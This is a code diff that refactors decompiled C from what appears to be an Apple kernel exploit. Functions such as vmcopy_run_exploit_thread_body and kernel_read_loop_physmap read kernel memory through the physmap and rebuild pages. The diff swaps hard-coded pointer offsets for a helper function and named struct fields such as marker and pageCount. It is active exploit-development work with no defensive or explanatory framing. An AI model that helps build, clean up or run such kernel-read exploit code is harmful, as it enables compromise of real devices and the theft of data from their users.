@@ -460,6 +460,11 @@ _Static_assert(sizeof(PhysmapReadResult) == 688, "PhysmapReadResult size mismatc
 
 #undef VMCOPY_ASSERT_OFFSET
 
+static inline PhysmapReadResult *physmap_read_result_at(uint64_t state, uint64_t index)
+{
+  return (PhysmapReadResult *)(state + 16 + sizeof(PhysmapReadResult) * index);
+}
+
 static inline __int64 vmcopy_run_exploit_thread_body(
         __int64 *state,
         thread_act_t *targetThread,
@@ -5903,7 +5908,7 @@ LABEL_36:
 LABEL_40:
   *(uint64_t *)v271 = v27;
   arc4random_buf((void *)(v4 + 13584), 8u);
-  arc4random_buf((void *)(v4 + 13592), 8u);
+  arc4random_buf(&((PhysmapLoopState *)v4)->marker, 8u);
   v28 = *(uint64_t *)(v4 + 13448);
   v10 = 708609;
   if ( !v28 )
@@ -5986,11 +5991,12 @@ LABEL_50:
       v10 = v31 | 0x80000000;
       goto LABEL_51;
     }
-    v31 = kernel_read_loop_physmap(v5, v4, 0x10u, v4 + 688 * v30 + 16);
+    PhysmapReadResult *activeResult = physmap_read_result_at(v4, v30);
+    v31 = kernel_read_loop_physmap(v5, v4, 0x10u, (__int64)activeResult);
     if ( v31 )
       goto LABEL_50;
     get_page_size();
-    v294 = (int8x8_t *)(v4 + 688 * v30 + 16);
+    v294 = (int8x8_t *)activeResult;
     v32 = physmap_read_rebuild_page((uint64_t *)v4, v294);
     if ( !(uint32_t)v32 )
       break;
@@ -6012,12 +6018,13 @@ LABEL_100:
   v264 = *(uint64_t *)(v4 + 13432);
   v266 = *(unsigned int *)(v4 + 13544);
   v259 = (mach_port_t *)(v4 + 4 * v30 + 13480);
-  v34 = v4 + 688 * v30;
-  v281 = (unsigned int *)(v34 + 48);
+  PhysmapReadResult *scanResult = physmap_read_result_at(v4, v30);
+  v34 = (__int64)scanResult - 16;
+  v281 = &scanResult->pageCount;
   v276 = -(int)v266;
   v10 = 708620;
-  v35 = (uint64_t *)(v4 + 13592);
-  kobject = v34 + 40;
+  v35 = &((PhysmapLoopState *)v4)->marker;
+  kobject = (__int64)&scanResult->processedPageMask;
   do
   {
     a1[0] = 0;
@@ -6089,7 +6096,7 @@ LABEL_89:
       {
 LABEL_87:
         v46 = *v45;
-        v35 = (uint64_t *)(v4 + 13592);
+        v35 = &((PhysmapLoopState *)v4)->marker;
         v42 = *v281;
         goto LABEL_88;
       }
@@ -6133,7 +6140,7 @@ LABEL_85:
     v42 = *v281;
     v10 = 708625;
     v304 = v52;
-    v35 = (uint64_t *)(v4 + 13592);
+    v35 = &((PhysmapLoopState *)v4)->marker;
 LABEL_92:
     v45 = (int8x8_t *)kobject;
 LABEL_93:
@@ -6260,7 +6267,7 @@ LABEL_195:
             if ( ((1LL << v80) & *(uint64_t *)&v83) == 0 )
             {
               v85 = (uint64_t *)(*(uint64_t *)v64 + (unsigned int)((uint32_t)v80 << v73));
-              if ( *v85 != *(uint64_t *)(v4 + 13592) )
+              if ( *v85 != ((PhysmapLoopState *)v4)->marker )
               {
                 v86 = *(uint32_t *)(v5 + 384);
                 if ( v72 < v86 )
